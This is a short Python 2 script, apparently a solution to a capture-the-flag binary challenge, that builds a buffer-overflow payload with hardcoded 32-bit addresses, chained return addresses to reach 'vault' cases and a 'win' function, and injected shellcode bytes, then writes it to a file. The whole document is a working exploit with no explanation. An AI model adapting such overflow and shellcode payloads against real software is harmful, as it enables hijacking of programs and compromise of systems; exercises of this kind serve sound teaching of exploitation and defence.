import struct

# Convert integer to byte array (integer little endian).
def dw(i):
        return struct.pack("<I",i)
case_3=0x08048736
case_4=0x0804874E

var_1=0x8048895
var_2=0x80488ba
var_3=0x80488ea

var_2_a=0xdeadc0de
var_3_a=0xf8f26913
var_3_b=0xe5bb55dc

call_edx=0x0804858d
win=0x0804882B
exit=0x08048994

# Unlock vault
payload = '3'
payload+='\n'
payload += 'a' * 4
payload+=dw(0x0)
payload+=dw(var_1)
payload+=dw(var_2)
payload+=dw(case_3)
payload+=dw(var_2_a)

payload += 'a' * 4
payload+=dw(0x0)
payload+=dw(var_3)
payload+=dw(case_4)
payload+=dw(var_3_a)
payload+=dw(var_3_b)

#Afisare "Win"
payload+='G'*9
payload+=dw(0x69d03110)
payload+=dw(0x5d9f3ac0)
payload+=dw(0xa260a304)
payload+=dw(0x2bb80804)
payload+=dw(0xff080488)
payload+=dw(0x8994b8d0)
payload+=dw(0xd0ff0804)
payload+="RemusBompa"
payload+='G'*914
payload+='H'*39
payload+=dw(0x0)
payload+=dw(call_edx)
payload+='H'*7
payload+=dw(0x04a3e8a1)
payload+=dw(0xc1c28908)
payload+='\xe0'
with open('payload', 'wb') as f:
    f.write(payload)

